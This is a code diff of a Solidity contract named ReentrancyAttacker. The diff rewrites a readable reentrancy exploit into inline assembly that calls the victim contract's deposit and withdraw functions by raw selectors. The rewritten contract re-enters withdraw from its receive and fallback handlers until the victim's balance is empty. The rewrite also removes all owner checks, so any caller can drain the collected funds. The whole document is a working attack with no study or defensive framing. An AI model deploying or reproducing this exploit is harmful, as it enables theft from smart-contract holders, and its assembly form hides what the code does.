@@ -1,48 +1,66 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.0;
 
-interface IVictimBank {
-    function deposit() external payable;
-    function withdraw() external;
-}
-
 contract ReentrancyAttacker {
-    address private immutable owner;
-    IVictimBank private immutable victimContract;
-
-    constructor(address _victim) {
-        owner = msg.sender;
-        victimContract = IVictimBank(_victim);
+    
+    constructor(address v) {
+        assembly { sstore(0, v) }
     }
-
-    function feed() external payable {
-        require(msg.sender == owner, "Not owner");
-        require(msg.value > 0, "No EVM_Cyptro Sent");
-        victimContract.deposit{value: msg.value}();
+    
+    function attack() external payable {
+        assembly {
+            let v := sload(0)
+            let amount := callvalue() 
+            sstore(1, amount)
+            mstore(0, 0xd0e30db000000000000000000000000000000000000000000000000000000000)
+            pop(call(gas(), v, amount, 0, 4, 0, 0))
+             mstore(0, 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)
+            let success1 := call(gas(), v, 0, 0, 4, 0, 0)
+            if iszero(success1) {
+                mstore(0, 0x2e1a7d4d00000000000000000000000000000000000000000000000000000000)
+                mstore(4, amount)
+                pop(call(gas(), v, 0, 0, 36, 0, 0))
+            }
+        }
     }
-
-    function attack() external {
-        require(msg.sender == owner, "Not owner");
-        victimContract.withdraw();
-    }
-
+    
     receive() external payable {
-        uint256 targetBalance = address(victimContract).balance;
-        if (targetBalance > 0) {
-            victimContract.withdraw();
+        assembly {
+            let v := sload(0)
+            let amount := sload(1)
+            
+            if gt(balance(v), 0) {
+                mstore(0, 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)
+                let success1 := call(gas(), v, 0, 0, 4, 0, 0)
+                if iszero(success1) {
+                    mstore(0, 0x2e1a7d4d00000000000000000000000000000000000000000000000000000000)
+                    mstore(4, amount)
+                    pop(call(gas(), v, 0, 0, 36, 0, 0))
+                }
+            }
         }
     }
 
     fallback() external payable {
-        uint256 targetBalance = address(victimContract).balance;
-
-        if (targetBalance > 0) {
-            victimContract.withdraw();
+        assembly {
+            let v := sload(0)
+            let amount := sload(1)
+            
+            if gt(balance(v), 0) {
+                mstore(0, 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)
+                let success1 := call(gas(), v, 0, 0, 4, 0, 0)
+                if iszero(success1) {
+                    mstore(0, 0x2e1a7d4d00000000000000000000000000000000000000000000000000000000)
+                    mstore(4, amount)
+                    pop(call(gas(), v, 0, 0, 36, 0, 0))
+                }
+            }
         }
     }
-    
+
     function drain() external {
-        require(msg.sender == owner, "Not owner");
-        payable(owner).transfer(address(this).balance);
+        assembly {
+            pop(call(gas(), caller(), selfbalance(), 0, 0, 0, 0))
+        }
     }
 }
